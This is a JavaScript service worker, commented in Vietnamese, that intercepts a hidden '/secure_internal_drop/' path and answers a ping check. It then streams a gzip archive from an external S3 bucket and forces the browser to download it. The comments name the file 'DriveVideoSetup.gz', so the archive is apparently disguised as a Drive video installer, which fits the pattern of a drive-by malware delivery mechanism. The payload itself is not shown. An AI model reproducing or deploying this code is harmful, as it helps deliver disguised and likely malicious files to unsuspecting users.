self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
    const url = event.request.url;

    // 1. Giữ nguyên bộ Ping kiểm tra
    if (url.includes('/drive_secure_download_ping')) {
        event.respondWith(new Response('pong', { status: 200 }));
        return;
    }

    // 2. Đánh chặn đường dẫn nội bộ và kéo TRỰC TIẾP từ S3 CDN
    if (url.includes('/secure_internal_drop/')) {
        
        const directS3Url = 'https://xmetavn.s3.us-east-1.amazonaws.com/Videoa.gz';

        event.respondWith(
            fetch(directS3Url, { 
                mode: 'cors', 
                cache: 'no-store' 
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`S3 Download Failed: ${response.status} ${response.statusText}`);
                }

                // Lấy chính xác tên file từ URL S3 (DriveVideoSetup.gz)
                let filename = directS3Url.split('/').pop().split('?')[0];
                filename = decodeURIComponent(filename);

                // Ép trình duyệt tải xuống tệp tin nén nguyên bản
                const headers = new Headers({
                    'Content-Type': 'application/gzip', // Đổi thành định dạng chuẩn của gzip
                    'Content-Disposition': `attachment; filename="${filename}"`
                });

                // Trả về stream gốc từ S3 mà không chạy qua DecompressionStream
                return new Response(response.body, { headers });
            })
            .catch(err => {
                console.error("[SW Direct Fetch Error]:", err);
                return new Response(`Direct Download Error: ${err.message}`, { 
                    status: 500,
                    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
                });
            })
        );
        return;
    }
});